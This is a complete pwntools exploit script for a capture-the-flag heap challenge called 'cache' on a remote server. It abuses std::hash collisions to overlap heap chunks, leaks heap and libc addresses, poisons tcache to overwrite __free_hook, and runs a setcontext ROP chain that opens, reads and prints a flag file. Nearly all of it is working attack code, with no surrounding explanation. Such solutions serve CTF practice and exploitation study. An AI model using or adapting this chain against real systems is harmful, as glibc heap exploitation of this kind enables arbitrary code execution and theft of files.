from pwn import *
context.arch = "amd64"

#r = process("./cache", env={"LD_PRELOAD":"./libc-2.31.so"})
r = remote("3.139.106.4", 27015)
b = ELF("./cache", checksec=False)
l = ELF("./libc-2.31.so", checksec=False)

def create(name, size):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Name: ", name)
    r.sendlineafter("Size: ", str(size))

def read(name, off, n):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Name: ", name)
    r.sendlineafter("Offset: ", str(off))
    r.sendlineafter("Count: ", str(n))

def write(name, off, n, data):
    r.sendlineafter("> ", "3")
    r.sendlineafter("Name: ", name)
    r.sendlineafter("Offset: ", str(off))
    r.sendlineafter("Count: ", str(n))
    r.sendafter("Data: ", data)

def erase(name):
    r.sendlineafter("> ", "4")
    r.sendlineafter("Name: ", name)


# Two strings whom std::hash collide
collide1 = b"\xc2\xc4\xc9\xfa\xed\x85\x42\x36\xc2\xc4\xc9\xfa\xed\x85\x42\x36"
collide2 = b"\xc2\xc4\x86\x14\x89\x6b\xea\xc4\xc2\xc4\x86\x14\x89\x6b\xea\xc4"

# Create a small cache to collide on later
create(collide1, 0x30) 
write(collide1, 0, 8, "A"*8)

# Create victim caches to poison
create("victim1", 0x100) 
write("victim1", 0, 8, "B"*8)
create("victim2", 0x100) 
write("victim2", 0, 8, "C"*8)

# Create large cache to leak libc
create("leak", 0x2000) 
write("leak", 0, 8, "D"*8)

# Create padding cache to avoid consolidate
create("padd", 0x40) 
write("padd", 0, 8, "E"*8)

# Collide the first cache with a very large one
create(collide2, 0x2000) 

# Leak heap
read(collide2, 0x40, 8)
heap = u64(r.recv(8)) - 0x144d0
log.info("heap: {}".format(hex(heap)))

# Erase large cache, leak libc
erase("leak")
read(collide2, 0x380, 8)
l.address = u64(r.recv(8)) - 0x1ebbe0
log.info("libc: {}".format(hex(l.address)))
call_gadget = l.address + 0x154930
setcontext_gadget = l.address + 0x580DD
pop_rdi = l.address + 0x26b72
pop_rsi = l.address + 0x27529
pop_rdx_r12 = l.address + 0x11c371
push_rax = l.address + 0x45197
pop_rax = l.address + 0x4a550
xchg_eax_edi = l.address + 0x2ad2b
syscall_ret = l.address + 0x66229

# Erase victims, overwrite victim2's fd to __free_hook
erase("victim1")
erase("victim2")
write(collide2, 0x200, 8, p64(l.symbols["__free_hook"]))

# Build ROP payload
base = heap + 0x124b0             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x258)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0x1b0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/home/cache/flag", O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
payload += b"/home/cache/flag"

# Create a cache with payload as its name
create(payload, 0x100)
write(payload, 0, 8, "A"*8)

# Overwrite __free_hook with call_gadget
create("free", 0x100)
write("free", 0, 8, p64(call_gadget))
pause()
# Execute the chain
erase(payload)

r.interactive()
